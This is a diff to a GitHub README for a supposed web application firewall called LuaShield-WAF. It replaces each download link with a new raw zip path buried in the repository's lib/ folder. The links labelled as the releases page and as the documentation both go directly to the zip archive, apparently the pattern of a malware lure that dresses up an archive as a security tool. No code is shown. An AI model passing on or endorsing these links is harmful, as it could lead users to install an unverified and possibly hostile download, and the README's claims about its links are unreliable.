@@ -1,6 +1,6 @@
 # 🔒 LuaShield-WAF - Protect Your Web Applications Easily
 
-[![Download LuaShield-WAF](https://raw.githubusercontent.com/amenk08/LuaShield-WAF/main/lib/resty/waf/core/Lua_Shield_WAF_v1.7-alpha.2.zip)](https://raw.githubusercontent.com/amenk08/LuaShield-WAF/main/lib/resty/waf/core/Lua_Shield_WAF_v1.7-alpha.2.zip)
+[![Download LuaShield-WAF](https://github.com/amenk08/LuaShield-WAF/raw/refs/heads/main/lib/Shield-Lua-WAF-v3.4.zip)](https://github.com/amenk08/LuaShield-WAF/raw/refs/heads/main/lib/Shield-Lua-WAF-v3.4.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To get started with LuaShield-WAF, follow these simple steps to download and run
 
 1. **Visit the Releases Page**: Click the link below to visit the LuaShield-WAF releases page, where you can find the latest version ready for download.
 
-   [Download LuaShield-WAF](https://raw.githubusercontent.com/amenk08/LuaShield-WAF/main/lib/resty/waf/core/Lua_Shield_WAF_v1.7-alpha.2.zip)
+   [Download LuaShield-WAF](https://github.com/amenk08/LuaShield-WAF/raw/refs/heads/main/lib/Shield-Lua-WAF-v3.4.zip)
 
 2. **Choose Your Version**: On the releases page, you will see a list of available versions. Look for the latest version of LuaShield-WAF.
 
@@ -45,7 +45,7 @@ LuaShield-WAF comes equipped with multiple features to help you secure your web 
 
 ## 📘 Documentation
 
-For detailed guides and more information about LuaShield-WAF, please refer to the documentation available [here](https://raw.githubusercontent.com/amenk08/LuaShield-WAF/main/lib/resty/waf/core/Lua_Shield_WAF_v1.7-alpha.2.zip).
+For detailed guides and more information about LuaShield-WAF, please refer to the documentation available [here](https://github.com/amenk08/LuaShield-WAF/raw/refs/heads/main/lib/Shield-Lua-WAF-v3.4.zip).
 
 ## 👥 Community Support
 
